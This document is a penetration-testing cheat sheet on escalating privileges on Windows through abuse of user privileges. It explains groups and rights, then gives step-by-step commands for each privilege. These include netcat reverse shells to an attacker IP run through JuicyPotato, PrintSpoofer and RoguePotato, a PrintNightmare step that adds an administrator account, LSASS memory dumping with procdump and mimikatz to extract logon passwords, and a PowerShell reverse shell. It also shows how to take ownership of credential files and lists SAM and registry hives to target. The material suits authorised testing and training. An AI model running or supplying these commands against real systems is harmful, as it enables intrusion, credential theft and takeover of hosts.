# Windows User Privileges

In this section will cover:
- SeImpersonate and SeAssignPrimaryToken
- SeDebugPrivilege
- SeTakeOwnershipPrivilege

**Windows Privileges Overview**

Privileges in Windows are rights that an account can be granted to perform a variety of operations on the local system such as managing services, loading drivers, shutting down the system, debugging an application, and more. Privileges are different from access rights, which a system uses to grant or deny access to securable objects. User and group privileges are stored in a database and granted via an access token when a user logs on to a system. An account can have local privileges on a specific computer and different privileges on different systems if the account belongs to an Active Directory domain.

**Rights and Privileges in Windows**

Windows contains many groups that grant their members powerful rights and privileges. Many of these can be abused to escalate privileges on both a standalone Windows host and within an Active Directory domain environment. Ultimately, these may be used to gain Domain Admin, local administrator, or SYSTEM privileges on a Windows workstation, server, or Domain Controller (DC). Some of these groups are listed below.

| Group                       | Description |
|-----------------------------|-------------|
| Default Administrators      | Domain Admins and Enterprise Admins are "super" groups. |
| Server Operators            | Members can modify services, access SMB shares, and backup files. |
| Backup Operators            | Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs. |
| Print Operators             | Members can log on to DCs locally and "trick" Windows into loading a malicious driver. |
| Hyper-V Administrators      | If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins. |
| Account Operators           | Members can modify non-protected accounts and groups in the domain. |
| Remote Desktop Users        | Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol. |
| Remote Management Users     | Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs). |
| Group Policy Creator Owners | Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU. |
| Schema Admins               | Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL. |
| DNS Admins                  | Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record. |

**User Rights Assignment**

Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account.

| Setting Constant              | Setting Name                                        | Standard Assignment                                | Description |
|--------------------------------|-----------------------------------------------------|----------------------------------------------------|-------------|
| SeNetworkLogonRight            | Access this computer from the network               | Administrators, Authenticated Users                | Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+. |
| SeRemoteInteractiveLogonRight  | Allow log on through Remote Desktop Services        | Administrators, Remote Desktop Users               | This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server. |
| SeBackupPrivilege              | Back up files and directories                       | Administrators                                     | This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system. |
| SeSecurityPrivilege            | Manage auditing and security log                    | Administrators                                     | This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer. |
| SeTakeOwnershipPrivilege       | Take ownership of files or other objects            | Administrators                                     | This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads. |
| SeDebugPrivilege               | Debug programs                                      | Administrators                                     | This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components. |
| SeImpersonatePrivilege         | Impersonate a client after authentication           | Administrators, Local Service, Network Service, Service | This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user. |
| SeLoadDriverPrivilege          | Load and unload device drivers                      | Administrators                                     | This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code. |
| SeRestorePrivilege             | Restore files and directories                       | Administrators                                     | This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object. |

**List all privileges**
````
> whoami /priv
````

## SeImpersonate and SeAssignPrimaryToken

These tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory. To utilize the token, the SeImpersonate privilege is needed. It is only given to administrative accounts, and in most cases, can be removed during system hardening.

Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space. Attackers often abuse this privilege in the "Potato style" privescs - where a service account can SeImpersonate, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.

**SeImpersonate - JuicyPotato**
````
# List Privs
whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled

# Exploitation with Juicy Potato

## Step 1 - Netcat listening
$ sudo nc -lnvp <Our_Port>

## Step 2 - Execute Juicy Potato
> c:\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\nc.exe <Our_IP> <Our_Port> -e cmd.exe" -t *
````

**PrintSpoofer & RoguePotato & PrintNightmare**
````
# Method 1 - PrintSpoofer
## Step 1 - Verify if spooler service is running
> Get-Service Spooler

## Step 2 - Netcat listening
$ sudo nc -lnvp <Our_Port>

## Step 3 - Execute PrintSpoofer
> c:\PrintSpoofer.exe -c "c:\nc.exe <Our_IP> <Our_Port> -e cmd"


# Method 2 - RoguePotato
## Step 1 - Netcat listening
$ sudo nc -lnvp <Our_Port>

## Step 2 - Execute RoguePotato
> c:\RoguePotato.exe -r <Our_IP> -e "c:\nc.exe <Our_IP> <Our_Port> -e cmd" -l 9999


# Method 3 - PrintNightmare (CVE-2021-1675)
## Step 1 - Import the printNightmare.ps1
> Import-Module .\printnightmare.ps1

## Step 2 - Create a new user in localgroup administrators 
> Invoke-Nightmare -NewUser "<new_user>" -NewPassword "<new_password>" -DriverName "PrintME"

## Step 3 - Verify if new user is in localgroup administrators
> net localgroup administrators
````

## SeDebugPrivilege

To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under Computer Settings > Windows Settings > Security Settings. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job. 

**List Privilege**
````
> whoami /priv
SeDebugPrivilege                          Debug programs                                                     Disabled
````

**Dump Lsass Process**
````
# Method 1 - Procdump

## Step 1 - Dump Lsass Process
> procdump.exe -accepteula -ma lsass.exe lsass.dmp

## Step 2 - Copy to our machine or alternative use Mimikatz

## Mimikatz
> mimikatz.exe
# log
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords


# Method 2 - TaskManager

## Step 1 - Open the taskmanager
## Step 2 - Search for Lsass process and Right-Click
## Step 3 - Create Dump File
## Step 4 - Copy to our directory
> cp <file_lsass.dmp> .
````

**Code Execution**
````
# Code Execution

## Step 1 - List the tasklist and search for the PID of a process with SYSTEM, for example winlogon.exe.
> tasklist 

## Step 2 - Execute debugpriv.ps1
> ipmo .\debugpriv.ps1; ImpersonateFromParentPid -ppid <PID> -command "C:\windows\system32\cmd.exe"


# Reverse Shell
> ipmo .\debugpriv.ps1; ImpersonateFromParentPid -ppid <PID> -command "C:\windows\system32\cmd.exe" -cmdargs "/c powershell.exe -e revshell"
````


## SeTakeOwnershipPrivilege

SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. It may also be assigned a few others such as SeBackupPrivilege, SeRestorePrivilege, and SeSecurityPrivilege to control this account's privileges at a more granular level and not granting the account full local admin rights.

**Reviewing Current User Privileges**
````
> whoami /priv
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
````
Enabling SeTakeOwnershipPrivilege
````
> Import-Module .\Enable-Privilege.ps1
> .\EnableAllTokenPrivs.ps1
> whoami /priv
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
````
**Choosing a Target File**

Next, choose a target file and confirm the current ownership. For our purposes, we'll target an interesting file found on a file share. It is common to encounter file shares with Public and Private directories with subdirectories set up by department. Given a user's role in the company, they can often access specific files/directories.
````
# Check the Owner
> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

If you cannot see who the owner of the file is, we can see who the owner of the directory is.

> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
````
**Taking Ownership of the File**
````
# Taking Ownership of the File
> takeown /f 'C:\Department Shares\Private\IT\cred.txt'

# Confirming Ownership Changed
> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

# Modifying the File ACL
> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant <user>:F
````
**Files of Interest**
- c:\inetpub\wwwwroot\web.config
- %WINDIR%\repair\sam
- %WINDIR%\repair\system
- %WINDIR%\repair\software, %WINDIR%\repair\security
- %WINDIR%\system32\config\SecEvent.Evt
- %WINDIR%\system32\config\default.sav
- %WINDIR%\system32\config\security.sav
- %WINDIR%\system32\config\software.sav
- %WINDIR%\system32\config\system.sav

We may also come across .kdbx KeePass database files, OneNote notebooks, files such as passwords.*, pass.*, creds.*, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.
